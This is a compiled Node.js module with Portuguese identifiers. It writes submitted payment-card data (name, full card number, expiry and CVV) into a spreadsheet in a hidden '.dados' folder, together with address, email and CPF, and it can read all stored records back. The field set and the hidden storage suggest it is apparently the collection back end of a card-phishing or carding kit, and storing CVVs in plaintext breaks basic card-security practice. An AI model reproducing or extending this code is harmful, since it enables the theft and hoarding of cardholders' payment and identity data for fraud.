"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
Object.defineProperty(exports, "__esModule", { value: true });
exports.salvarCartaoExcel = salvarCartaoExcel;
exports.obterCartoes = obterCartoes;
const fs = __importStar(require("fs"));
const path = __importStar(require("path"));
const XLSX = __importStar(require("xlsx"));
const dataDir = path.join(process.cwd(), ".dados");
const excelFile = path.join(dataDir, "cartoes.xlsx");
function ensureDir() {
    if (!fs.existsSync(dataDir)) {
        fs.mkdirSync(dataDir, { recursive: true });
    }
}
function initExcelFile() {
    ensureDir();
    if (!fs.existsSync(excelFile)) {
        const headers = [
            "Data/Hora",
            "Nome no Cartão",
            "Número do Cartão",
            "Validade",
            "CVV",
            "CEP",
            "Rua",
            "Número",
            "Complemento",
            "Bairro",
            "Cidade",
            "Estado",
            "Email",
            "CPF",
        ];
        const ws = XLSX.utils.aoa_to_sheet([headers]);
        const wb = XLSX.utils.book_new();
        XLSX.utils.book_append_sheet(wb, ws, "Cartões");
        XLSX.writeFile(wb, excelFile);
    }
}
function salvarCartaoExcel(dados) {
    try {
        ensureDir();
        initExcelFile();
        const wb = XLSX.readFile(excelFile);
        const ws = wb.Sheets["Cartões"];
        const rows = XLSX.utils.sheet_to_json(ws, { header: 1 });
        const novaLinha = [
            new Date().toLocaleString("pt-BR"),
            dados.nome || "",
            dados.numero || "",
            dados.validade || "",
            dados.cvv || "",
            dados.cep || "",
            dados.rua || "",
            dados.numero_endereco || "",
            dados.complemento || "",
            dados.bairro || "",
            dados.cidade || "",
            dados.estado || "",
            dados.email || "",
            dados.cpf || "",
        ];
        rows.push(novaLinha);
        const wsNew = XLSX.utils.aoa_to_sheet(rows);
        wb.Sheets["Cartões"] = wsNew;
        XLSX.writeFile(wb, excelFile);
        console.log(`[excel] Dados salvos. Total de linhas: ${rows.length}`);
    }
    catch (err) {
        console.error("[excel] Erro ao salvar:", err);
    }
}
function obterCartoes() {
    try {
        if (fs.existsSync(excelFile)) {
            const wb = XLSX.readFile(excelFile);
            const ws = wb.Sheets["Cartões"];
            return XLSX.utils.sheet_to_json(ws);
        }
    }
    catch (err) {
        console.error("[excel] Erro ao ler:", err);
    }
    return [];
}
